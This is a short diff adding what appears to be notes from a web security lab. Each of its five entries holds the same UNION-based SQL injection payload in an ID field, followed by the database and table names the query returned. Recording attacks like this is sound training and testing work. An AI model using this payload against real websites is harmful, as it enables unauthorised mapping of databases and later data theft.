@@ -1,0 +1,19 @@
+ID: 1 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.COLUMNS; 
+First name: Member_Brute_Force
+Surname : db_default
+
+ID: 1 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.COLUMNS; 
+First name: Member_Sql_Injection
+Surname : users
+
+ID: 1 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.COLUMNS; 
+First name: Member_guestbook
+Surname : guestbook
+
+ID: 1 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.COLUMNS; 
+First name: Member_images
+Surname : list_images
+
+ID: 1 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.COLUMNS; 
+First name: Member_survey
+Surname : vote_dbs
